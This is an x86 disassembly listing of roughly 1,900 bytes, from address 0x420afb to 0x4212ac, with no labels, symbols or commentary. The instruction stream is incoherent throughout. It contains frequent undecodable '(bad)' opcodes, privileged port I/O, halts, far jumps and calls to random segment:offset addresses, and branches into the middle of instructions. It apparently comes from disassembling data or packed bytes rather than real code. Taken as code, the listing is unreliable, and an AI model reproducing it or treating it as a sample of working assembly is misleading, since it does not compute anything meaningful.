  420afb:	or     ebx,DWORD PTR [eax-0xae5c568]
  420b01:	in     eax,dx
  420b02:	cli    
  420b03:	out    0x6a,eax
  420b05:	mov    cl,0x85
  420b07:	gs pop esi
  420b09:	mov    ecx,0xf1af2452
  420b0e:	push   edx
  420b0f:	fs dec eax
  420b11:	mov    ebp,0xca602109
  420b16:	adc    al,BYTE PTR [edi-0xf]
  420b19:	dec    ecx
  420b1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b1b:	push   es
  420b1c:	adc    eax,0x6be35acd
  420b21:	(bad)  [eax]
  420b23:	mov    bh,0xe
  420b25:	pushw  ds
  420b27:	or     cl,BYTE PTR [eax+0x4de95fbb]
  420b2d:	pop    ss
  420b2e:	lock daa 
  420b30:	push   esi
  420b31:	xor    eax,0xbaf281cf
  420b36:	cmp    al,0xde
  420b38:	mov    ecx,0xf3cebc01
  420b3d:	xor    ch,BYTE PTR [esi]
  420b3f:	test   BYTE PTR [esi+0x56],bl
  420b42:	mov    es,edi
  420b44:	out    dx,eax
  420b45:	xor    DWORD PTR [ecx-0x3a47138b],ebp
  420b4b:	mov    DWORD PTR [ebx-0x4c],eax
  420b4e:	add    al,0xaa
  420b50:	jmp    0xbc7523c7
  420b55:	int3   
  420b56:	jb     0x420b2c
  420b58:	mov    dh,0x3c
  420b5a:	je     0x420bd0
  420b5c:	aaa    
  420b5d:	loop   0x420ba0
  420b5f:	add    eax,0x9146a722
  420b64:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b66:	fucom  st(3)
  420b68:	push   edx
  420b69:	in     eax,0x5c
  420b6b:	adc    eax,0x89ee7e39
  420b70:	or     al,0x40
  420b72:	(bad)  
  420b73:	stc    
  420b74:	repnz and BYTE PTR [esi+0x2bd7a8d1],0x70
  420b7c:	xchg   ecx,eax
  420b7d:	mov    bh,0x5f
  420b7f:	xchg   ebp,eax
  420b80:	popa   
  420b81:	jae    0x420bed
  420b83:	mov    bh,0x13
  420b85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b86:	es ja  0x420bf7
  420b89:	jo     0x420b46
  420b8b:	scas   al,BYTE PTR es:[edi]
  420b8c:	cmp    esp,0x7e
  420b8f:	mov    ds,WORD PTR [edi-0x2cb11766]
  420b95:	ja     0x420bb1
  420b97:	ret    
  420b98:	out    dx,eax
  420b99:	push   0xffffff89
  420b9b:	aas    
  420b9c:	jbe    0x420bce
  420b9e:	mov    DWORD PTR [edi+0x28],ebx
  420ba1:	jge    0x420c06
  420ba3:	(bad)  
  420ba4:	sbb    BYTE PTR [edi+eiz*4],bh
  420ba7:	call   0x42a98280
  420bac:	scas   al,BYTE PTR es:[edi]
  420bad:	mov    cl,0xd1
  420baf:	adc    cl,BYTE PTR [ebx+ebp*1]
  420bb2:	inc    ebp
  420bb3:	xchg   ebx,eax
  420bb4:	mov    gs,WORD PTR [esi]
  420bb6:	dec    edi
  420bb7:	fisubr DWORD PTR [edx-0x2ff204b6]
  420bbd:	fnstenv [edx+0x3c]
  420bc0:	mov    cl,0x27
  420bc2:	int    0x9
  420bc4:	push   esi
  420bc5:	xor    dl,dl
  420bc7:	xchg   ecx,eax
  420bc8:	sub    BYTE PTR [ebx+edx*1+0x12],dh
  420bcc:	cdq    
  420bcd:	mov    ds,WORD PTR [ebp+0x11]
  420bd0:	out    0xb4,al
  420bd2:	xchg   edi,eax
  420bd3:	or     eax,0xaa5cdb28
  420bd8:	popa   
  420bd9:	mov    ds:0x3a5232f5,eax
  420bde:	(bad)  
  420bdf:	in     al,dx
  420be0:	sti    
  420be1:	xchg   esp,eax
  420be2:	or     BYTE PTR [ebp+0x3b8bd9a8],bh
  420be8:	(bad)  
  420bea:	or     al,0xfb
  420bec:	shl    DWORD PTR [edx],cl
  420bee:	and    BYTE PTR [ecx],0xd6
  420bf1:	push   0xffffffff
  420bf3:	mov    DWORD PTR [edx],0xdaa90e23
  420bf9:	outs   dx,BYTE PTR ds:[esi]
  420bfa:	cld    
  420bfb:	sbb    ebp,edx
  420bfd:	or     ecx,edx
  420bff:	(bad)  
  420c00:	jns    0x420c7e
  420c02:	xor    ecx,DWORD PTR [ecx]
  420c04:	(bad)  
  420c05:	mov    edi,0x85a88ce7
  420c0a:	mov    bl,0x68
  420c0c:	lods   eax,DWORD PTR ds:[esi]
  420c0d:	xor    BYTE PTR [eax-0x7b],bl
  420c10:	test   DWORD PTR [ebp+0x1e696d04],0xf974e9b8
  420c1a:	retf   
  420c1b:	stc    
  420c1c:	sbb    edx,DWORD PTR [ebp+edi*8+0x53]
  420c20:	or     BYTE PTR [ebx-0x65],0xa6
  420c24:	pop    ebx
  420c25:	(bad)  
  420c26:	xor    ecx,DWORD PTR [esi]
  420c28:	in     eax,dx
  420c29:	mov    ch,0x58
  420c2b:	jmp    0x258138e3
  420c30:	push   esi
  420c31:	push   eax
  420c32:	pop    ebx
  420c33:	scas   eax,DWORD PTR es:[edi]
  420c34:	mov    BYTE PTR [ebx+0x42],bl
  420c37:	inc    edi
  420c38:	dec    edx
  420c39:	enter  0x6730,0xd6
  420c3d:	mov    esp,0x3232f487
  420c42:	retf   0xd979
  420c45:	(bad)  
  420c48:	ja     0x420c50
  420c4a:	inc    ebx
  420c4b:	push   edi
  420c4c:	es call 0xd66d:0x63b666d
  420c54:	(bad)  [edi-0x15b5a14]
  420c5a:	int    0xd1
  420c5c:	ds fcom st(4)
  420c5f:	fstp   TBYTE PTR [esi-0x79]
  420c62:	jmp    0x7398:0xc8011bcb
  420c69:	and    eax,0x994c7eb6
  420c6e:	pop    ds
  420c6f:	je     0x420cb2
  420c71:	and    edi,DWORD PTR [esi+0xf206140]
  420c77:	or     al,0xa
  420c79:	lock repz mov al,ds:0xd7832b
  420c80:	sbb    eax,0x282a49a7
  420c85:	adc    ebp,0x9ac12f2b
  420c8b:	xchg   edx,eax
  420c8c:	pop    ebp
  420c8d:	jbe    0x420c6a
  420c8f:	aas    
  420c90:	xor    ebx,DWORD PTR [ebx+ebx*8]
  420c93:	xor    ah,BYTE PTR [eax-0x47701133]
  420c99:	add    bl,BYTE PTR [esi-0x5afd52fb]
  420c9f:	sbb    edi,DWORD PTR [esi+0x1b]
  420ca2:	out    0x23,al
  420ca4:	dec    eax
  420ca5:	pop    ebp
  420ca6:	xchg   esi,eax
  420ca7:	and    bl,BYTE PTR [ebp-0x19]
  420caa:	adc    al,0xbb
  420cac:	mov    WORD PTR ds:0xf740b87c,?
  420cb2:	out    0x62,eax
  420cb4:	ja     0x420cac
  420cb6:	mov    eax,0x23af0e98
  420cbb:	and    eax,0xa8266699
  420cc0:	jge    0x420c6d
  420cc2:	mov    ebp,0x7eecebba
  420cc7:	mov    WORD PTR [edx],fs
  420cc9:	jb     0x420d3b
  420ccb:	and    esi,esp
  420ccd:	in     al,dx
  420cce:	mov    edx,DWORD PTR [ecx-0x71]
  420cd1:	jbe    0x420d2f
  420cd3:	das    
  420cd4:	lock nop DWORD PTR [ebp+0x12]
  420cd9:	pop    ecx
  420cda:	mov    ah,BYTE PTR [esi+0x49]
  420cdd:	pop    ebx
  420cde:	idiv   dh
  420ce0:	ins    BYTE PTR es:[edi],dx
  420ce1:	add    dh,BYTE PTR [ecx]
  420ce3:	pop    ebp
  420ce4:	lods   eax,DWORD PTR ds:[esi]
  420ce5:	ror    ebx,cl
  420ce7:	mov    dl,0xfb
  420ce9:	adc    DWORD PTR [ebx+eiz*2+0x63],esi
  420ced:	cli    
  420cee:	pop    ds
  420cef:	iret   
  420cf0:	jns    0x420d08
  420cf2:	stos   DWORD PTR es:[edi],eax
  420cf3:	inc    BYTE PTR [ebx]
  420cf5:	push   ss
  420cf6:	push   ss
  420cf7:	loope  0x420d49
  420cf9:	pop    esi
  420cfa:	mov    BYTE PTR [ebp+0x323f58a4],ch
  420d00:	bound  ebx,QWORD PTR [edx-0x59]
  420d03:	fucomi st,st(6)
  420d05:	mov    cl,0x44
  420d07:	mov    eax,ds:0x589d9c23
  420d0c:	outs   dx,BYTE PTR ds:[esi]
  420d0d:	mov    edi,0x200e5737
  420d12:	in     eax,0x69
  420d14:	inc    ebx
  420d15:	aam    0x5e
  420d17:	ds cwde 
  420d19:	push   0x7f65d47c
  420d1e:	or     eax,0x46530720
  420d23:	inc    ecx
  420d24:	push   cs
  420d25:	inc    ebx
  420d26:	cwde   
  420d27:	imul   edx,ebp,0x4
  420d2a:	(bad)  
  420d2b:	dec    edi
  420d2c:	xor    eax,0xdecc600f
  420d31:	inc    edi
  420d32:	push   ebp
  420d33:	pop    ebx
  420d34:	adc    eax,0x5eb436ca
  420d39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d3a:	popa   
  420d3b:	mov    esp,0x1b834507
  420d40:	(bad)  
  420d42:	jnp    0x420d74
  420d44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d45:	cmp    esi,DWORD PTR [ebx]
  420d47:	dec    ebp
  420d48:	add    al,0x37
  420d4a:	test   eax,0x7bdb1fad
  420d4f:	xor    al,0x9a
  420d51:	mov    edi,0x1c384f11
  420d56:	inc    edi
  420d57:	stos   BYTE PTR es:[edi],al
  420d58:	jp     0x420d23
  420d5a:	enter  0x1b0a,0xdf
  420d5e:	dec    ecx
  420d5f:	in     eax,0xd6
  420d61:	das    
  420d62:	push   esp
  420d63:	mov    bh,0x65
  420d65:	xor    eax,0xec923eb3
  420d6a:	adc    DWORD PTR [ebp+0x6e],esp
  420d6d:	iret   
  420d6e:	mov    ecx,0x9d15f710
  420d73:	loopne 0x420d87
  420d75:	push   0xffffffe7
  420d77:	mov    bh,0x2e
  420d79:	mov    cl,0xae
  420d7b:	and    DWORD PTR [ebx],edx
  420d7d:	(bad)  
  420d7e:	mov    al,ds:0xbebcdde4
  420d83:	sar    eax,1
  420d85:	hlt    
  420d86:	in     al,0xaf
  420d88:	dec    esp
  420d89:	sbb    BYTE PTR [ebx+0x42],ch
  420d8c:	in     eax,0x93
  420d8e:	cmp    edi,esi
  420d90:	or     eax,0xd33f8002
  420d95:	jmp    0xccbbb4d6
  420d9a:	jecxz  0x420dc6
  420d9c:	clc    
  420d9d:	sub    DWORD PTR [bp+di+0x6],esp
  420da1:	lods   eax,DWORD PTR ds:[esi]
  420da2:	push   ebp
  420da3:	push   eax
  420da4:	retf   
  420da5:	bound  edi,QWORD PTR [edx+0x24c4a392]
  420dab:	and    cl,bl
  420dad:	call   0x8ff8:0xc7149223
  420db4:	call   0x2aad:0x9f3a2f15
  420dbb:	jecxz  0x420d46
  420dbd:	js     0x420d55
  420dbf:	(bad)  
  420dc1:	dec    eax
  420dc2:	iret   
  420dc3:	imul   ebp,DWORD PTR [ecx-0x56],0x65bc3979
  420dca:	lock icebp 
  420dcc:	or     ah,BYTE PTR ds:0xda3d29e8
  420dd2:	and    al,0xba
  420dd4:	push   0xffffff96
  420dd6:	loopne 0x420e53
  420dd8:	and    al,0xd0
  420dda:	je     0x420e37
  420ddc:	and    al,0xdc
  420dde:	pop    esi
  420ddf:	lods   al,BYTE PTR ds:[esi]
  420de0:	sub    eax,0x292f5510
  420de5:	(bad)  
  420de6:	jae    0x420dd1
  420de8:	jne    0x420dd4
  420dea:	mov    bh,0x26
  420dec:	mov    bl,0xa4
  420dee:	in     al,dx
  420def:	push   ss
  420df0:	inc    esp
  420df1:	shl    cl,cl
  420df3:	ss dec edi
  420df5:	and    cl,BYTE PTR ds:0xc24bcdae
  420dfb:	out    0xf,eax
  420dfd:	leave  
  420dfe:	repz and DWORD PTR [ebx],0x90422bce
  420e05:	sbb    bh,0x79
  420e08:	into   
  420e09:	or     al,BYTE PTR [ebp-0x1e]
  420e0c:	jg     0x420dc1
  420e0e:	loope  0x420e3a
  420e10:	das    
  420e11:	ds cmp al,0x88
  420e14:	inc    ebp
  420e15:	(bad)  
  420e16:	out    0x8d,al
  420e18:	xchg   ebp,eax
  420e19:	cmp    eax,0xeb65aa25
  420e1e:	out    dx,al
  420e1f:	aaa    
  420e20:	stc    
  420e21:	pop    ebx
  420e22:	add    DWORD PTR [ebp+0x11],edx
  420e25:	cdq    
  420e26:	xchg   edx,eax
  420e27:	in     eax,0x53
  420e29:	outs   dx,DWORD PTR ds:[esi]
  420e2a:	pop    esi
  420e2b:	cli    
  420e2c:	add    bl,bl
  420e2e:	inc    ecx
  420e2f:	jecxz  0x420dec
  420e31:	sbb    esi,ebx
  420e33:	adc    DWORD PTR [ebx-0x20],edx
  420e36:	(bad)  
  420e37:	fisubr DWORD PTR [ebx+0x303b706d]
  420e3d:	int3   
  420e3e:	mov    ah,0x7a
  420e40:	dec    ecx
  420e41:	dec    edx
  420e42:	mov    ebp,0x49a3f5e3
  420e47:	mov    bl,0xbe
  420e49:	xchg   ebp,eax
  420e4a:	inc    ebx
  420e4b:	jmp    0x8eef:0x4d4392af
  420e52:	jns    0x420eb6
  420e54:	mov    edi,0x76c910e8
  420e59:	jbe    0x420e86
  420e5b:	lea    esp,[edi]
  420e5d:	push   0x7a
  420e5f:	(bad)  
  420e61:	push   ds
  420e62:	dec    edi
  420e63:	call   0xcadfdf8d
  420e68:	jno    0x420e6a
  420e6a:	inc    esp
  420e6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e6c:	jle    0x420ebc
  420e6e:	cmp    BYTE PTR [edx-0x4e589b58],bh
  420e74:	push   edi
  420e75:	sub    ebx,DWORD PTR [edi-0x41681ba0]
  420e7b:	mov    dh,0x35
  420e7d:	in     eax,0xcb
  420e7f:	retf   0xee2a
  420e82:	pop    ebx
  420e83:	inc    edi
  420e84:	scas   eax,DWORD PTR es:[edi]
  420e85:	mov    ebx,0x4a0551e9
  420e8a:	fiadd  WORD PTR [ebp-0x1e1afc03]
  420e90:	retf   0xfdd8
  420e93:	popa   
  420e94:	mov    bl,0xc0
  420e96:	jp     0x420f07
  420e98:	jg     0x420ec0
  420e9a:	test   eax,0x27a62812
  420e9f:	out    dx,eax
  420ea0:	call   0x2615:0x9da90db3
  420ea7:	(bad)  
  420ea8:	imul   edx,DWORD PTR [ecx],0xffffffbc
  420eab:	xchg   esi,eax
  420eac:	or     bl,BYTE PTR [eax]
  420eae:	ror    BYTE PTR [ebp-0x7f],0x79
  420eb2:	ret    0x6465
  420eb5:	jbe    0x420e87
  420eb7:	inc    ebp
  420eb8:	mov    dl,0x17
  420eba:	or     eax,0xa04c4bea
  420ebf:	(bad)  
  420ec0:	push   edx
  420ec1:	adc    DWORD PTR [ebx],esi
  420ec3:	int3   
  420ec4:	xlat   BYTE PTR ds:[ebx]
  420ec5:	mov    eax,0x12390da4
  420eca:	pop    eax
  420ecb:	and    al,0x2b
  420ecd:	pause  
  420ecf:	jmp    0x73ae3fe2
  420ed4:	retf   0x2ef5
  420ed7:	nop
  420ed8:	retf   
  420ed9:	jo     0x420ece
  420edb:	jns    0x420ee5
  420edd:	(bad)  
  420ede:	and    BYTE PTR [ecx-0x12],bl
  420ee1:	aam    0x9
  420ee3:	popf   
  420ee4:	mov    ds:0x6f4b691e,al
  420ee9:	mov    eax,0x71b8a445
  420eee:	test   BYTE PTR [edi],ah
  420ef0:	std    
  420ef1:	dec    esi
  420ef2:	mov    eax,0x5772782a
  420ef7:	and    esi,ebx
  420ef9:	cmp    DWORD PTR [ebp-0x14b2749c],eax
  420eff:	push   ecx
  420f00:	arpl   di,dx
  420f02:	out    dx,al
  420f03:	jns    0x420e90
  420f05:	test   DWORD PTR [edx+0x33],ecx
  420f08:	jb     0x420f1b
  420f0a:	pop    ss
  420f0b:	and    bh,BYTE PTR [eax+esi*2]
  420f0e:	mov    bh,0xf7
  420f10:	mov    ebx,0x98c26354
  420f15:	in     al,dx
  420f16:	jbe    0x420f78
  420f18:	loop   0x420eb9
  420f1a:	xchg   esi,eax
  420f1b:	jns    0x420f71
  420f1d:	sub    DWORD PTR [ebp-0x5b],0x48
  420f21:	and    DWORD PTR fs:[esi+0x32],0xffffffa1
  420f26:	push   0xffffff86
  420f28:	xor    eax,DWORD PTR [edi+esi*8+0x6a]
  420f2c:	ins    DWORD PTR es:[edi],dx
  420f2d:	outs   dx,DWORD PTR ds:[esi]
  420f2e:	push   ds
  420f2f:	out    dx,al
  420f30:	and    BYTE PTR [edx-0x64],ah
  420f33:	scas   eax,DWORD PTR es:[edi]
  420f34:	adc    eax,0xb1263602
  420f39:	inc    ebp
  420f3a:	pop    ss
  420f3b:	mov    eax,?
  420f3d:	xchg   edi,eax
  420f3e:	stc    
  420f3f:	add    ch,0x36
  420f42:	sub    DWORD PTR [ecx-0x5315004f],esi
  420f48:	mov    esp,edx
  420f4a:	test   eax,0x21dd0004
  420f4f:	push   esi
  420f50:	call   0xc823:0x9c20aafa
  420f57:	loope  0x420f13
  420f59:	adc    DWORD PTR [edi+ebx*2],ecx
  420f5c:	mov    DWORD PTR [eax],ebx
  420f5e:	aas    
  420f5f:	dec    esp
  420f60:	lea    edx,[ecx-0x147127ab]
  420f66:	loopne 0x420f8d
  420f68:	mov    al,ds:0xb1223536
  420f6d:	ror    BYTE PTR [eax+0xc941dad],1
  420f73:	(bad)  
  420f74:	lahf   
  420f75:	mov    edi,0xd5ccd5e3
  420f7a:	cli    
  420f7b:	push   cs
  420f7c:	pop    edx
  420f7d:	sbb    cl,BYTE PTR [ecx+0x50]
  420f80:	pusha  
  420f81:	loop   0x420f48
  420f83:	mov    ebp,0x11d0c1d
  420f88:	pop    esp
  420f89:	repnz enter 0xbbd7,0x3e
  420f8e:	sub    dh,BYTE PTR [esp+edx*4]
  420f91:	scas   eax,DWORD PTR es:[edi]
  420f92:	outs   dx,BYTE PTR ds:[esi]
  420f93:	sub    DWORD PTR [edx],ebx
  420f95:	xchg   esi,eax
  420f96:	and    DWORD PTR [edx+0x4d],ecx
  420f99:	jmp    0x40d3:0x2a6a1616
  420fa0:	jno    0x420ffe
  420fa2:	repz add al,0x40
  420fa5:	dec    ecx
  420fa6:	inc    ebx
  420fa7:	hlt    
  420fa8:	mov    edx,0x4d8fae38
  420fad:	pop    ss
  420fae:	and    eax,0x8c80de10
  420fb3:	popf   
  420fb4:	cmp    eax,0xdfdad379
  420fb9:	mov    esp,gs
  420fbb:	sbb    dh,BYTE PTR [esi-0x21]
  420fbe:	xor    al,0x9a
  420fc0:	sub    al,0x1b
  420fc2:	addr16 push esp
  420fc4:	cmp    DWORD PTR [ecx],esp
  420fc6:	fdivr  DWORD PTR [edi-0x3]
  420fc9:	aad    0x3d
  420fcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420fcc:	xchg   ecx,edi
  420fce:	xchg   BYTE PTR [esi-0x1a],al
  420fd1:	cld    
  420fd2:	inc    ecx
  420fd3:	dec    ebx
  420fd4:	and    al,0x3f
  420fd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fd7:	pop    ebp
  420fd8:	mov    ebx,0xc0762780
  420fdd:	push   esi
  420fde:	out    dx,al
  420fdf:	add    eax,0x5074aed8
  420fe4:	ins    BYTE PTR es:[edi],dx
  420fe5:	pop    edx
  420fe6:	repz xchg ebx,eax
  420fe8:	mov    bh,0x4e
  420fea:	sahf   
  420feb:	mov    ds:0x94bc9152,al
  420ff0:	test   al,0xad
  420ff2:	aas    
  420ff3:	mov    esp,DWORD PTR [ecx]
  420ff5:	dec    eax
  420ff6:	(bad)  
  420ff7:	adc    BYTE PTR [edx-0x52bfa251],dl
  420ffd:	dec    eax
  420ffe:	ret    0x9557
  421001:	or     dl,BYTE PTR [ebp+0x54]
  421004:	push   ebp
  421005:	ret    0xc97e
  421008:	push   ss
  421009:	call   0xe643:0xf6b82eb1
  421010:	hlt    
  421011:	inc    esp
  421012:	push   0xffffff8d
  421014:	jmp    0x4f9a:0x448123ab
  42101b:	fdivr  QWORD PTR [ebp-0x42]
  42101e:	jmp    DWORD PTR [esi-0x7f309f1c]
  421024:	mov    ds:0x4d5fdd95,eax
  421029:	push   esi
  42102a:	int3   
  42102b:	dec    esi
  42102c:	add    al,0x40
  42102e:	in     al,dx
  42102f:	add    eax,0x8124573a
  421034:	ret    0xfb2c
  421037:	(bad)  
  421038:	out    dx,eax
  421039:	and    BYTE PTR [eax],dl
  42103b:	lods   eax,DWORD PTR ds:[esi]
  42103c:	xor    DWORD PTR [edx],eax
  42103e:	jle    0x421013
  421040:	fmul   DWORD PTR [eax-0x2a]
  421043:	dec    edi
  421044:	mov    dh,0xa3
  421047:	jmp    0x421056
  421049:	jmp    DWORD PTR [ecx]
  42104b:	je     0x4210a5
  42104d:	gs ja  0x420ff1
  421050:	scas   al,BYTE PTR es:[edi]
  421051:	cld    
  421052:	fimul  DWORD PTR [edi+0x3d74d0cc]
  421058:	sbb    dh,dl
  42105a:	add    al,0x7a
  42105c:	pop    ds
  42105d:	or     eax,0xbc9120f8
  421062:	into   
  421063:	jo     0x42101e
  421065:	ret    0xb1ff
  421068:	cmp    eax,0xb5e4c391
  42106d:	xchg   edi,eax
  42106e:	repnz inc esp
  421070:	stos   DWORD PTR es:[edi],eax
  421071:	gs arpl di,si
  421074:	add    ebx,DWORD PTR [ebp-0x25]
  421077:	aad    0x96
  421079:	ins    BYTE PTR es:[edi],dx
  42107a:	call   0xa8c1:0x5beae558
  421081:	xchg   ebp,eax
  421082:	inc    edx
  421083:	push   ss
  421084:	retf   
  421085:	shl    esp,1
  421087:	dec    esi
  421088:	sub    eax,0xcb017854
  42108d:	imul   edi,DWORD PTR [edx-0xf693f20],0x15
  421094:	mov    esp,gs
  421096:	or     DWORD PTR [esi+ebp*1-0x57],ebx
  42109a:	test   eax,0xc774b754
  42109f:	ret    
  4210a0:	cmp    dl,BYTE PTR [esi-0x3b]
  4210a3:	fdivr  st,st(4)
  4210a5:	cmc    
  4210a6:	pusha  
  4210a7:	test   al,0xfa
  4210a9:	mov    edx,0x4341d3d0
  4210ae:	je     0x42109b
  4210b0:	mov    ecx,0x9766439d
  4210b5:	fsub   QWORD PTR [ebx]
  4210b7:	mov    edi,0xde91966e
  4210bc:	adc    BYTE PTR [ebx-0x47b393c6],al
  4210c2:	mov    ebx,0x88dd9916
  4210c8:	jle    0x4210f2
  4210ca:	xor    al,0xf3
  4210cc:	jmp    0x58103d64
  4210d1:	dec    ebx
  4210d2:	sbb    BYTE PTR [ecx],bl
  4210d4:	add    al,0xb0
  4210d6:	dec    edx
  4210d7:	ficom  WORD PTR [edi+0x5e]
  4210da:	and    dh,ah
  4210dc:	test   DWORD PTR [ebx+edi*1-0x42],ecx
  4210e0:	jmp    0x4210f8
  4210e2:	add    al,0xd9
  4210e4:	mov    al,0xad
  4210e6:	and    al,0xaf
  4210e8:	sub    edi,DWORD PTR [ebx-0x31]
  4210eb:	jae    0x4210a5
  4210ed:	ins    BYTE PTR es:[edi],dx
  4210ee:	jae    0x4210be
  4210f0:	repz sbb ebp,DWORD PTR [edi-0x1b]
  4210f4:	loope  0x4210af
  4210f6:	push   edi
  4210f7:	jns    0x421134
  4210f9:	or     ebp,DWORD PTR [esi+0x18]
  4210fc:	jne    0x4210ca
  4210fe:	xlat   BYTE PTR ds:[ebx]
  4210ff:	sbb    eax,0xcf962b9d
  421104:	jb     0x421088
  421106:	push   ebx
  421107:	sub    dl,BYTE PTR [esp+0x13]
  42110b:	inc    ebp
  42110c:	icebp  
  42110d:	cmc    
  42110e:	aaa    
  42110f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421110:	add    ecx,DWORD PTR [ebp-0x647e756f]
  421116:	(bad)  
  421117:	loope  0x421127
  421119:	cld    
  42111a:	scas   eax,DWORD PTR es:[edi]
  42111b:	xchg   edi,eax
  42111c:	jl     0x421190
  42111e:	xchg   esp,eax
  42111f:	ss or  eax,0x9f7757d9
  421125:	xor    al,0xcc
  421127:	adc    ebx,esp
  421129:	cwde   
  42112a:	pop    ss
  42112b:	dec    ecx
  42112c:	dec    esp
  42112d:	push   edi
  42112e:	(bad)  
  42112f:	mov    edi,0x317ea62c
  421134:	test   al,0x9a
  421136:	mov    DWORD PTR [ebp-0x7c],ecx
  421139:	dec    edi
  42113a:	add    al,0xa0
  42113c:	lahf   
  42113d:	xor    DWORD PTR [esi+0x76],ecx
  421140:	je     0x4210e6
  421142:	cld    
  421143:	push   0x5a
  421145:	gs mov esi,0xe6b374c8
  42114b:	aam    0x69
  42114d:	pushf  
  42114e:	and    edi,DWORD PTR [eax+0x7507ca61]
  421154:	inc    edx
  421155:	ins    BYTE PTR es:[edi],dx
  421156:	test   DWORD PTR [ebp-0x3b],esp
  421159:	pop    ds
  42115a:	pop    eax
  42115b:	sbb    ch,cl
  42115d:	dec    esi
  42115e:	div    BYTE PTR [ecx-0x37632665]
  421164:	add    eax,0xded87649
  421169:	xchg   ebx,eax
  42116a:	sar    DWORD PTR [ebp+0x18f35784],cl
  421170:	xlat   BYTE PTR ds:[ebx]
  421171:	xchg   ebx,eax
  421172:	loope  0x4211f2
  421174:	outs   dx,BYTE PTR ds:[esi]
  421175:	mov    esp,0x2e458cc4
  42117a:	ins    BYTE PTR es:[edi],dx
  42117b:	jne    0x421138
  42117d:	out    dx,eax
  42117e:	shl    BYTE PTR [edx],cl
  421180:	cmc    
  421181:	push   cs
  421182:	in     eax,0x94
  421184:	cmp    cl,bh
  421186:	rcl    DWORD PTR [eax+0x44aab7ac],0x71
  42118d:	jnp    0x42112c
  42118f:	dec    eax
  421190:	or     bh,BYTE PTR [esi]
  421192:	or     esi,DWORD PTR [eax+0x62]
  421195:	dec    edx
  421196:	rcr    dl,1
  421198:	in     al,0x16
  42119a:	xor    BYTE PTR [esi],0x32
  42119d:	and    eax,DWORD PTR [ecx+0x35a037c1]
  4211a3:	sar    DWORD PTR ds:0xbb4ff2ad,1
  4211a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211aa:	lea    ebp,[edx+0xa]
  4211ad:	push   0x5e
  4211af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211b0:	sti    
  4211b1:	xchg   ebp,eax
  4211b2:	push   0x91af37b0
  4211b7:	pop    es
  4211b8:	lahf   
  4211b9:	aaa    
  4211ba:	sbb    eax,esi
  4211bc:	(bad)  
  4211bd:	adc    eax,edx
  4211bf:	pop    eax
  4211c0:	fdiv   DWORD PTR [esi]
  4211c2:	out    0x8c,al
  4211c4:	imul   ebx,DWORD PTR [esi+0x54],0x1062c076
  4211cb:	mov    ecx,0xbed7484
  4211d0:	(bad)  
  4211d1:	in     al,dx
  4211d2:	xchg   ebx,eax
  4211d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211d4:	xchg   ecx,eax
  4211d5:	loope  0x42115a
  4211d7:	mov    ch,0x8b
  4211d9:	mov    ecx,0x9ac77aaa
  4211de:	or     eax,0xad1358cc
  4211e3:	adc    al,ah
  4211e5:	out    0xa7,eax
  4211e7:	jp     0x421265
  4211e9:	jmp    0xcdbe:0x6ab9dbef
  4211f0:	ins    DWORD PTR es:[edi],dx
  4211f1:	sbb    al,0x5b
  4211f3:	xor    eax,0x213cf962
  4211f8:	lea    esp,[esp+eiz*8+0x44]
  4211fc:	add    BYTE PTR cs:[esi+ebp*2-0x4b],ch
  421201:	or     eax,DWORD PTR [eax]
  421203:	add    ebx,edx
  421205:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421206:	clc    
  421207:	or     ebx,DWORD PTR [eax]
  421209:	jns    0x421221
  42120b:	xchg   esp,eax
  42120c:	mov    fs,WORD PTR [edx+0x75296d7c]
  421212:	iret   
  421213:	adc    eax,0x827c698b
  421218:	pop    esi
  421219:	cmp    al,0x9e
  42121b:	adc    BYTE PTR [esi-0x17],0x49
  42121f:	into   
  421220:	cli    
  421221:	cli    
  421222:	cmc    
  421223:	push   cs
  421224:	push   edx
  421225:	sub    DWORD PTR [ecx],edx
  421227:	push   eax
  421228:	xchg   edi,eax
  421229:	mov    ss,WORD PTR [ebp-0x19]
  42122c:	mov    al,0xeb
  42122e:	jecxz  0x4211ef
  421230:	and    eax,0x1a309480
  421235:	mov    edx,0x8f485e9d
  42123a:	and    ch,bl
  42123c:	sub    bx,WORD PTR [eax+0x8]
  421240:	fs loop 0x4212b8
  421243:	and    ch,bl
  421245:	out    0xe6,eax
  421247:	mov    ebp,0xcc3b1741
  42124c:	fsub   DWORD PTR [esi+edi*4]
  42124f:	inc    esp
  421250:	sbb    eax,0xafa48d6a
  421255:	inc    ebx
  421256:	push   esi
  421257:	jmp    0x65aa:0xa866245b
  42125e:	or     dl,BYTE PTR gs:[ebx]
  421261:	add    esi,DWORD PTR [esi+0x565f250e]
  421267:	sbb    eax,0xbf3ae6c6
  42126c:	call   0xaf7f2694
  421271:	lods   eax,DWORD PTR ds:[esi]
  421272:	inc    ecx
  421273:	ss ret 0x912b
  421277:	in     eax,dx
  421278:	mov    DWORD PTR [edx],edx
  42127a:	ud0    edi,DWORD PTR [ecx+0x7c]
  42127e:	mov    dh,BYTE PTR [ebx+0x16]
  421281:	mov    al,0xe2
  421283:	xor    eax,0x758629bd
  421288:	ds push eax
  42128a:	and    BYTE PTR [eax-0x5e],0x5f
  42128e:	das    
  42128f:	push   0x41
  421291:	das    
  421292:	lds    ebx,FWORD PTR [ebx+0x25]
  421295:	sbb    BYTE PTR [esi+ecx*2+0x41],al
  421299:	outs   dx,DWORD PTR ds:[esi]
  42129a:	xchg   edx,eax
  42129b:	xchg   edi,eax
  42129c:	sbb    edi,ebp
  42129e:	shl    BYTE PTR [edi],1
  4212a0:	push   esi
  4212a1:	sub    al,0x2d
  4212a3:	add    al,0xc4
  4212a5:	cmp    edx,0x82d5ff20
  4212ab:	xchg   ecx,eax
  4212ac:	mov    esi,DWORD PTR [esi]
